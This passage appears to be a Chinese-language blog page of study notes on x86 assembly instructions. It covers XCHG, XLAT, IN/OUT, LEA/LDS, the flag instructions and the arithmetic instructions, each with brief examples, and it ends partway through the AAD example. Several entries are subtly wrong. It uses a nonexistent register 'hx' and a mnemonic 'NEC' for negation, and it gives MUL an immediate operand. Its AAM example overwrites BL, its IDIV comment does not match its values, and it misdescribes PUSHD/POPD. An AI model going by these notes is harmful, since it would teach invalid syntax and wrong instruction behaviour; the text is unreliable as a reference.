&lt;h3 id=&#34;XCHG-交换字或字节-至少有一个操作数为寄存器-段寄存器不可作为操作数&#34;&gt;&lt;a href=&#34;#XCHG-交换字或字节-至少有一个操作数为寄存器-段寄存器不可作为操作数&#34; class=&#34;headerlink&#34; title=&#34;XCHG 交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)&#34;&gt;&lt;/a&gt;XCHG 交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;xchg ax,hx
xchg ah,al
xchg eax,ebx
xchg var,ax;var16位&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CMPXCHG-比较并交换操作数-第二个操作数必须为累加器AL-AX-EAX&#34;&gt;&lt;a href=&#34;#CMPXCHG-比较并交换操作数-第二个操作数必须为累加器AL-AX-EAX&#34; class=&#34;headerlink&#34; title=&#34;CMPXCHG 比较并交换操作数( 第二个操作数必须为累加器AL/AX/EAX )&#34;&gt;&lt;/a&gt;CMPXCHG 比较并交换操作数( 第二个操作数必须为累加器AL/AX/EAX )&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;CMPXCHG CX,DX
;如果指令执行前 (AX)=2300H,(CX)=2300H.(DX)=2400H
;则指令执行后 因（CX）=(AX),故(CX)=2400H,ZF=1
;如果指令执行前（AX）=2500H,(CX)=2300H,(DX)=2400H
;则指令执行后因（CX）!=(AX)，故(AX)=2300H，ZF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;XADD-先交换再累加-结果在第一个操作数里&#34;&gt;&lt;a href=&#34;#XADD-先交换再累加-结果在第一个操作数里&#34; class=&#34;headerlink&#34; title=&#34;XADD 先交换再累加( 结果在第一个操作数里 )&#34;&gt;&lt;/a&gt;XADD 先交换再累加( 结果在第一个操作数里 )&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;xadd eax，ecx
;相当于：
	先执行：
		xchg eax,ecx
	然后执行：
		add eax,ecx&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;XLAT-字节查表转换&#34;&gt;&lt;a href=&#34;#XLAT-字节查表转换&#34; class=&#34;headerlink&#34; title=&#34;XLAT 字节查表转换&#34;&gt;&lt;/a&gt;XLAT 字节查表转换&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;X DW 1122h,3344h,5566h,7788h
lea bx,X
mov al,03h
xlat&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即 0-FFH); 返回 AL 为查表结果 ( [BX+AL]-&amp;gt;AL )&lt;/p&gt;
&lt;h1 id=&#34;输入输出端口传送指令&#34;&gt;&lt;a href=&#34;#输入输出端口传送指令&#34; class=&#34;headerlink&#34; title=&#34;输入输出端口传送指令&#34;&gt;&lt;/a&gt;输入输出端口传送指令&lt;/h1&gt;&lt;h3 id=&#34;IN-I-O端口输入&#34;&gt;&lt;a href=&#34;#IN-I-O端口输入&#34; class=&#34;headerlink&#34; title=&#34;IN I/O端口输入&#34;&gt;&lt;/a&gt;IN I/O端口输入&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;语法: IN 累加器, {端口号│DX}&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;OUT-I-O端口输出&#34;&gt;&lt;a href=&#34;#OUT-I-O端口输出&#34; class=&#34;headerlink&#34; title=&#34;OUT I/O端口输出&#34;&gt;&lt;/a&gt;OUT I/O端口输出&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;语法: OUT {端口号│DX},累加器&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;输入输出端口由立即方式指定时-其范围是-0-255-由寄存器-DX-指定时-其范围是-0-65535&#34;&gt;&lt;a href=&#34;#输入输出端口由立即方式指定时-其范围是-0-255-由寄存器-DX-指定时-其范围是-0-65535&#34; class=&#34;headerlink&#34; title=&#34;输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535&#34;&gt;&lt;/a&gt;输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535&lt;/h3&gt;&lt;h1 id=&#34;目的地址传送指令&#34;&gt;&lt;a href=&#34;#目的地址传送指令&#34; class=&#34;headerlink&#34; title=&#34;目的地址传送指令&#34;&gt;&lt;/a&gt;目的地址传送指令&lt;/h1&gt;&lt;h3 id=&#34;LEA-装入有效地址&#34;&gt;&lt;a href=&#34;#LEA-装入有效地址&#34; class=&#34;headerlink&#34; title=&#34;LEA 装入有效地址&#34;&gt;&lt;/a&gt;LEA 装入有效地址&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;LEA DX,string ;把偏移地址存到DX&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LDS-传送目标指针-把指针内容装入DS&#34;&gt;&lt;a href=&#34;#LDS-传送目标指针-把指针内容装入DS&#34; class=&#34;headerlink&#34; title=&#34;LDS 传送目标指针,把指针内容装入DS&#34;&gt;&lt;/a&gt;LDS 传送目标指针,把指针内容装入DS&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;LDS SI,string ;把段地址:偏移地址存到DS:SI&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LES-传送目标指针-把指针内容装入ES&#34;&gt;&lt;a href=&#34;#LES-传送目标指针-把指针内容装入ES&#34; class=&#34;headerlink&#34; title=&#34;LES 传送目标指针,把指针内容装入ES&#34;&gt;&lt;/a&gt;LES 传送目标指针,把指针内容装入ES&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;LES DI,string ;把段地址:偏移地址存到ESDI&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LFS-传送目标指针-把指针内容装入FS&#34;&gt;&lt;a href=&#34;#LFS-传送目标指针-把指针内容装入FS&#34; class=&#34;headerlink&#34; title=&#34;LFS 传送目标指针,把指针内容装入FS&#34;&gt;&lt;/a&gt;LFS 传送目标指针,把指针内容装入FS&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;LFS DI,string ;把段地址:偏移地址存到FSD&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LGS-传送目标指针-把指针内容装入GS&#34;&gt;&lt;a href=&#34;#LGS-传送目标指针-把指针内容装入GS&#34; class=&#34;headerlink&#34; title=&#34;LGS 传送目标指针,把指针内容装入GS&#34;&gt;&lt;/a&gt;LGS 传送目标指针,把指针内容装入GS&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;LGS DI,string ;把段地址:偏移地址存到GSDI &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LSS-传送目标指针-把指针内容装入SS&#34;&gt;&lt;a href=&#34;#LSS-传送目标指针-把指针内容装入SS&#34; class=&#34;headerlink&#34; title=&#34;LSS 传送目标指针,把指针内容装入SS&#34;&gt;&lt;/a&gt;LSS 传送目标指针,把指针内容装入SS&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;LSS DI,string ;把段地址:偏移地址存到SSDI&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;标志传送指令&#34;&gt;&lt;a href=&#34;#标志传送指令&#34; class=&#34;headerlink&#34; title=&#34;标志传送指令&#34;&gt;&lt;/a&gt;标志传送指令&lt;/h1&gt;&lt;h3 id=&#34;LAHF-标志寄存器传送-把标志装入AH&#34;&gt;&lt;a href=&#34;#LAHF-标志寄存器传送-把标志装入AH&#34; class=&#34;headerlink&#34; title=&#34;LAHF 标志寄存器传送,把标志装入AH&#34;&gt;&lt;/a&gt;LAHF 标志寄存器传送,把标志装入AH&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;.data
    saveflags byte ?
.code
    lahf
    mov saveflags,ah&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SAHF-标志寄存器传送-把AH内容装入标志寄存器&#34;&gt;&lt;a href=&#34;#SAHF-标志寄存器传送-把AH内容装入标志寄存器&#34; class=&#34;headerlink&#34; title=&#34;SAHF 标志寄存器传送,把AH内容装入标志寄存器&#34;&gt;&lt;/a&gt;SAHF 标志寄存器传送,把AH内容装入标志寄存器&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ah,saveflags
    sahf&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PUSHF-标志入栈&#34;&gt;&lt;a href=&#34;#PUSHF-标志入栈&#34; class=&#34;headerlink&#34; title=&#34;PUSHF 标志入栈&#34;&gt;&lt;/a&gt;PUSHF 标志入栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;pushf;保存标志寄存器内容&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;POPF-标志出栈&#34;&gt;&lt;a href=&#34;#POPF-标志出栈&#34; class=&#34;headerlink&#34; title=&#34;POPF 标志出栈&#34;&gt;&lt;/a&gt;POPF 标志出栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;popf;恢复标志寄存器内容&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PUSHD-32位标志入栈&#34;&gt;&lt;a href=&#34;#PUSHD-32位标志入栈&#34; class=&#34;headerlink&#34; title=&#34;PUSHD 32位标志入栈&#34;&gt;&lt;/a&gt;PUSHD 32位标志入栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;pushd;保存32通用寄存器内容&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;POPD-32位标志出栈&#34;&gt;&lt;a href=&#34;#POPD-32位标志出栈&#34; class=&#34;headerlink&#34; title=&#34;POPD 32位标志出栈&#34;&gt;&lt;/a&gt;POPD 32位标志出栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;popd;恢复32通用寄存器内存&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;算术运算指令&#34;&gt;&lt;a href=&#34;#算术运算指令&#34; class=&#34;headerlink&#34; title=&#34;算术运算指令&#34;&gt;&lt;/a&gt;算术运算指令&lt;/h1&gt;&lt;h3 id=&#34;ADD-加法&#34;&gt;&lt;a href=&#34;#ADD-加法&#34; class=&#34;headerlink&#34; title=&#34;ADD 加法&#34;&gt;&lt;/a&gt;ADD 加法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov eax,1
add eax,12&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ADC-带进位加法&#34;&gt;&lt;a href=&#34;#ADC-带进位加法&#34; class=&#34;headerlink&#34; title=&#34;ADC 带进位加法&#34;&gt;&lt;/a&gt;ADC 带进位加法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov dl,0
mov al,0FFh
add al,0FFh;AL=FEh
adc dl,0;DL/AL=01FEh&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;INC-加-1&#34;&gt;&lt;a href=&#34;#INC-加-1&#34; class=&#34;headerlink&#34; title=&#34;INC 加 1&#34;&gt;&lt;/a&gt;INC 加 1&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ax,1
inc ax&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;AAA-加法的ASCII码调整&#34;&gt;&lt;a href=&#34;#AAA-加法的ASCII码调整&#34; class=&#34;headerlink&#34; title=&#34;AAA 加法的ASCII码调整&#34;&gt;&lt;/a&gt;AAA 加法的ASCII码调整&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ah,0
mov al,&#39;8&#39;;AX=0038h
add al,&#39;2&#39;;AX=006Ah
aaa;AX=0100h(结果进行ASCII转换)
or ax,3030h;AX=3130h=&#39;10&#39;(转换为ASCII码)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;DAA-加法的十进制调整&#34;&gt;&lt;a href=&#34;#DAA-加法的十进制调整&#34; class=&#34;headerlink&#34; title=&#34;DAA 加法的十进制调整&#34;&gt;&lt;/a&gt;DAA 加法的十进制调整&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,35h
add al,48h;AL=7Dh
daa;AL=83h(调整后结果)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SUB-减法&#34;&gt;&lt;a href=&#34;#SUB-减法&#34; class=&#34;headerlink&#34; title=&#34;SUB 减法&#34;&gt;&lt;/a&gt;SUB 减法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,23
sub al,3&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SBB-带借位减法&#34;&gt;&lt;a href=&#34;#SBB-带借位减法&#34; class=&#34;headerlink&#34; title=&#34;SBB 带借位减法&#34;&gt;&lt;/a&gt;SBB 带借位减法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov edx,7;高32位
mov eax,1;低32位
sub eax，2
sbb edx，0;高32位减法&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;DEC-减-1&#34;&gt;&lt;a href=&#34;#DEC-减-1&#34; class=&#34;headerlink&#34; title=&#34;DEC 减 1&#34;&gt;&lt;/a&gt;DEC 减 1&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;dec al&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;NEC-求反-以-0-减之&#34;&gt;&lt;a href=&#34;#NEC-求反-以-0-减之&#34; class=&#34;headerlink&#34; title=&#34;NEC 求反(以 0 减之)&#34;&gt;&lt;/a&gt;NEC 求反(以 0 减之)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;nec al&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CMP-比较-两操作数作减法-仅修改标志位-不回送结果&#34;&gt;&lt;a href=&#34;#CMP-比较-两操作数作减法-仅修改标志位-不回送结果&#34; class=&#34;headerlink&#34; title=&#34;CMP 比较.(两操作数作减法,仅修改标志位,不回送结果)&#34;&gt;&lt;/a&gt;CMP 比较.(两操作数作减法,仅修改标志位,不回送结果)&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ax,5
cmp ax,10;ZF=0 and CF=1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;AAS-减法的ASCII码调整&#34;&gt;&lt;a href=&#34;#AAS-减法的ASCII码调整&#34; class=&#34;headerlink&#34; title=&#34;AAS 减法的ASCII码调整&#34;&gt;&lt;/a&gt;AAS 减法的ASCII码调整&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ah,0
mov al,&#39;8&#39;;AX=0038h
sub al,&#39;9&#39;;AX=00FFh
aas;AX=FF09h
pushf
or al,30h;AX=FF39h
popf&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;DAS-减法的十进制调整&#34;&gt;&lt;a href=&#34;#DAS-减法的十进制调整&#34; class=&#34;headerlink&#34; title=&#34;DAS 减法的十进制调整&#34;&gt;&lt;/a&gt;DAS 减法的十进制调整&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov bl,48h
mov al,85h
sub al,bl;AL=3Dh
das;AL=37h(调整后结果)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;MUL-无符号乘法&#34;&gt;&lt;a href=&#34;#MUL-无符号乘法&#34; class=&#34;headerlink&#34; title=&#34;MUL 无符号乘法&#34;&gt;&lt;/a&gt;MUL 无符号乘法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var word 0100h
mov ax,2000h;AX=2000h;AX存储结果
mul 0100h/var;DX:AX=00200000h,CF=1;32位EDX:EAX&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;IMUL-整数乘法&#34;&gt;&lt;a href=&#34;#IMUL-整数乘法&#34; class=&#34;headerlink&#34; title=&#34;IMUL 整数乘法&#34;&gt;&lt;/a&gt;IMUL 整数乘法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ax,48
mov bx,4
imul bx;DX:AX=000000C0h,OF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;以上两条-结果回送AH和AL-字节运算-或DX和AX-字运算&#34;&gt;&lt;a href=&#34;#以上两条-结果回送AH和AL-字节运算-或DX和AX-字运算&#34; class=&#34;headerlink&#34; title=&#34;以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算)&#34;&gt;&lt;/a&gt;以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算)&lt;/h3&gt;&lt;h3 id=&#34;AAM-乘法的ASCII码调整&#34;&gt;&lt;a href=&#34;#AAM-乘法的ASCII码调整&#34; class=&#34;headerlink&#34; title=&#34;AAM 乘法的ASCII码调整&#34;&gt;&lt;/a&gt;AAM 乘法的ASCII码调整&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var byte 05h,06h
mov bl,var;第一个操作数
mov bl,[var+1];第二个操作数
mul bl;AX=001Eh
aam;AX=0300h&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;DIV-无符号除法&#34;&gt;&lt;a href=&#34;#DIV-无符号除法&#34; class=&#34;headerlink&#34; title=&#34;DIV 无符号除法&#34;&gt;&lt;/a&gt;DIV 无符号除法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ax,0083h;被除数
mov bl,2;除数
div bl;AL=41h,AH=01h&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;IDIV-整数除法&#34;&gt;&lt;a href=&#34;#IDIV-整数除法&#34; class=&#34;headerlink&#34; title=&#34;IDIV 整数除法&#34;&gt;&lt;/a&gt;IDIV 整数除法&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var sword -101;009Bh
mov dx,0
mov ax,var;DX:AX=0000009Bh(+155)
mov bx,2;BX是除数
idiv bx;DX:AX除以BX
    
var sword -48
mov al,var;被除数低字节
cbw；AL扩展到AH
mov bl,+5;除数
idiv bl;AL=-9,AH=-3&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;以上两条-结果回送&#34;&gt;&lt;a href=&#34;#以上两条-结果回送&#34; class=&#34;headerlink&#34; title=&#34;以上两条,结果回送:&#34;&gt;&lt;/a&gt;以上两条,结果回送:&lt;/h3&gt;&lt;h3 id=&#34;商回送AL-余数回送AH-字节运算-或商回送AX-余数回送DX-字运算&#34;&gt;&lt;a href=&#34;#商回送AL-余数回送AH-字节运算-或商回送AX-余数回送DX-字运算&#34; class=&#34;headerlink&#34; title=&#34;商回送AL,余数回送AH, (字节运算);或商回送AX,余数回送DX, (字运算)&#34;&gt;&lt;/a&gt;商回送AL,余数回送AH, (字节运算);或商回送AX,余数回送DX, (字运算)&lt;/h3&gt;&lt;h3 id=&#34;AAD-除法的ASCII码调整&#34;&gt;&lt;a href=&#34;#AAD-除法的ASCII码调整&#34; class=&#34;headerlink&#34; title=&#34;AAD 除法的ASCII码调整&#34;&gt;&lt;/a&gt;AAD 除法的ASCII码调整&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var byte ?
var2 byte ?
mov ax,0307h;被除数
aad;AX=0025h
mov bl,5;除数
div bl;AX=0207h
mov var,al
